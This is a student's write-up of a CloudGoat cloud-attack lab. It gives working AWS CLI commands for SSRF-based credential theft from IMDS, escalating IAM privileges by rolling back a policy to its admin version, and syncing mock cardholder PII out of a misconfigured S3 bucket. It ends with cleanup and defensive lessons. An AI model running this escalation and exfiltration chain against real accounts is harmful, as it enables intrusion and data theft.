 Task 2: Cloud Attack Lab

Screenshot Commands
# Install screenshot tool if needed
sudo apt install gnome-screenshot -y

# Screenshot 1: S3 Bucket Enumeration
gnome-screenshot -a -f /home/kali/screenshot1_s3_enum.png
# Then select area showing: aws s3 ls --profile stolen-creds

# Screenshot 2: Exfiltrated Data
gnome-screenshot -a -f /home/kali/screenshot2_exfiltrated.png
# Then select area showing: cat /home/kali/exfiltrated/cardholder_data_primary.csv | head

# Screenshot 3: Privilege Escalation (IAM Rollback)
gnome-screenshot -a -f /home/kali/screenshot3_privesc.png
# Then select area showing: aws iam list-users --profile raynor

# Or take full screen:
gnome-screenshot -f /home/kali/screenshot_full.png

 Tools Used
- Pacu — IAM privilege escalation scanning
- awscli — S3 enumeration, IAM enumeration, policy rollback
- CloudGoat — Deployed vulnerable AWS scenarios

---

 1. Cloud Recon — S3 Bucket Enumeration

Enumerated S3 buckets using stolen IMDS credentials from SSRF vulnerability.

bash
aws s3 ls --profile stolen-creds

Findings:
| Asset ID | Service | Misconfiguration            | Notes                                    |
| -------- | ------- | --------------------------- | ---------------------------------------- |
| AID001   | S3      | Public read access via IMDS | cg-cardholder-data-bucket-cgidgbfduo0h0d |

Attack Path: SSRF on EC2 proxy → IMDS (169.254.169.254) → IAM role credentials → S3 bucket enumeration

2. Privilege Escalation — IAM Policy Rollback
Exploited IAM misconfiguration where user Raynor had SetDefaultPolicyVersion permission.
# Enumerate policy versions
aws iam list-policy-versions --policy-arn arn:aws:iam::594474086854:policy/cg-raynor-policy-cgid3bwmwnldar --profile raynor

# Found v3 with full admin access
aws iam get-policy-version --policy-arn arn:aws:iam::594474086854:policy/cg-raynor-policy-cgid3bwmwnldar --version-id v3 --profile raynor

# Roll back to admin version
aws iam set-default-policy-version --policy-arn arn:aws:iam::594474086854:policy/cg-raynor-policy-cgid3bwmwnldar --version-id v3 --profile raynor

# Verify escalation
aws iam list-users --profile raynor

Word Summary:
Exploited IAM misconfiguration where user Raynor had SetDefaultPolicyVersion permission. 
Enumerated policy versions on cg-raynor-policy, discovering v3 granted full admin access. 
Rolled back default policy version to v3, escalating from limited user to Administrator with wildcard permissions across all AWS resources

3. Data Exfiltration
Extracted mock PII data from misconfigured S3 bucket:
aws s3 sync s3://cg-cardholder-data-bucket-cgidgbfduo0h0d/ /home/kali/exfiltrated/ --profile stolen-creds
| File                          |          Size |
| ----------------------------- | ------------: |
| cardholder_data_primary.csv   |  58,872 bytes |
| cardholder_data_secondary.csv |  59,384 bytes |
| cardholders_corporate.csv     |  92,165 bytes |
| goat.png                      | 249,500 bytes |
Data confirmed: Contains mock PII including names, SSNs, addresses, and corporate cardholder records (500+ records).

Cleanup
cloudgoat destroy iam_privesc_by_rollback
cloudgoat destroy cloud_breach_s3

Key Learnings
IMDSv1 + SSRF — EC2 metadata service can expose IAM role credentials if not protected
Policy Version Rollback — SetDefaultPolicyVersion allows reverting to older, more permissive policy versions
Least Privilege — Instance roles should have minimal permissions; S3 buckets should block public access

